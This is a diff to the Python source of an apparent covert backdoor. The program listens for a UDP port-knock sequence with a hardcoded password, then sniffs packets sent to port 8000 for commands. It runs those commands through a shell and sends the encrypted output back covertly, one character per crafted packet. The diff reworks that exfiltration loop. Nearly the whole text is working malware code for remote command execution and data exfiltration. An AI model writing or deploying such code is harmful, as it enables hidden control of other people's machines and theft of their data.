@@ -8,6 +8,7 @@ from ctypes import cdll, byref, create_string_buffer
 state = 0
 ports = [1000, 2000, 3000]
 password = 'abcdefyoyo'
+maxPort = 65535
 # unauthClients = {}
 # authedClients = {}
 
@@ -52,22 +53,13 @@ def shellCommand(packet, command):
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     output = configfile.password + output.stdout.read() + output.stderr.read()
     encryptedData = encryption.encrypt(output, configfile.password)
-    print encryptedData
-    print len(encryptedData)
-    dataToSend = helpers.chunkString(2, encryptedData)
-    lastIndex = len(dataToSend) - 1
-    for index, pair in enumerate(dataToSend):
-    	packet = ''
-    	if len(pair) == 2:
-    		#char1, char2 = pair.split('')
-    		packet = packetFunctions.createPacketTwo(configfile.protocol, ip, pair[0], pair[1])
-    	else:
-    		packet = packetFunctions.createPacketOne(configfile.protocol, ip, pair)
-    	if index == lastIndex:
-    		packet = packet/Raw(load=configfile.password)
-    	send(packet)
-    	time.sleep(0.1)
-
+    lastIndex = len(encryptedData) - 1
+    for index, char in enumerate(encryptedData):
+        packet = packetFunctions.createPacketOne(configfile.protocol, ip, char)
+        if index == lastIndex:
+            packet = packet/Raw(load=configfile.password)
+        send(packet, verbose=0)
+        time.sleep(0.1)
 
 def watchAdd():
     print "watchAdd"
@@ -106,9 +98,11 @@ def parseCommand(packet):
 def main():
     while state is not 3:
         sniff(filter='udp', prn=knock, count=1)
-    print "test"
     while True:
         sniff(filter="dst port 8000", count=1, prn=parseCommand)
 
 if __name__ == '__main__':
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print "exiting.."
